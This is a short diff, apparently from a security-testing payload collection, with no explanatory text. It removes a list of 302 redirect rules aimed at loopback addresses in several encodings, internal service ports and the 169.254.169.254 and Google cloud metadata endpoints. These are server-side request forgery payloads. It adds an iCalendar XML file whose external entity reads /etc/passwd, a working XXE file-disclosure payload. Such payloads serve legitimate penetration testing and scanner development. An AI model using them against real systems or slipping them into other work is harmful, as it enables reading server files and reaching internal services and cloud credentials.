@@ -1,16 +1,6 @@
-/a  http://127.0.0.1/  302
-/b  http://127.0.0.1:8080/  302
-/c  http://127.0.0.1:3000/  302
-/d  http://localhost/  302
-/e  http://[::1]/  302
-/f  http://2130706433/  302
-/g  http://169.254.169.254/latest/meta-data/  302
-/h  http://metadata.google.internal/  302
-/i http://127.0.0.1:5601/  302
-/j http://127.0.0.1:9200/  302
-/k http://127.0.0.1:2375/  302
-/l http://127.0.0.1:5601/  302
-/m http://127.0.0.1:8500/  302
-/n  http://[::1]:8080/  302
-/o  http://[0:0:0:0:0:0:0:1]/  302
-/p  http://[::ffff:127.0.0.1]/  302
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<icalendar xmlns="urn:ietf:params:xml:ns:icalendar-2.0">
+<vcalendar><properties><prodid><text>&xxe;</text></prodid>
+<version><text>2.0</text></version></properties></vcalendar>
+</icalendar>
